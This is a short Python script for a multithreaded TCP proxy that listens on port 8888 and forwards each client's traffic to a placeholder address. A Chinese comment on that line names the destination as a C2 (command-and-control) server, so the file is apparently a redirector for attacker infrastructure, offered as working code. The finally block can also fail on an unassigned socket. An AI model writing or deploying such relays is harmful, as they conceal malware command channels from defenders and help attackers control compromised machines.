import socket
import threading

class ProxyServer:
    def __init__(self, host='0.0.0.0', port=8888):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((host, port))
        self.server.listen(100)

    def handle_client(self, client_socket):
        try:
            request = client_socket.recv(4096)
            if not request:
                return

            remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            remote_socket.connect(('IP地址', 8080))  # 连接到C2服务器
            remote_socket.sendall(request)

            while True:
                response = remote_socket.recv(4096)
                if not response:
                    break
                client_socket.sendall(response)

        except Exception as e:
            print(f'Error: {e}')

        finally:
            client_socket.close()
            remote_socket.close()

    def run(self):
        print('Proxy server running on port 8888...')
        while True:
            client_socket, addr = self.server.accept()
            client_handler = threading.Thread(target=self.handle_client, args=(client_socket,))
            client_handler.start()

if __name__ == '__main__':
    proxy_server = ProxyServer()
    proxy_server.run()
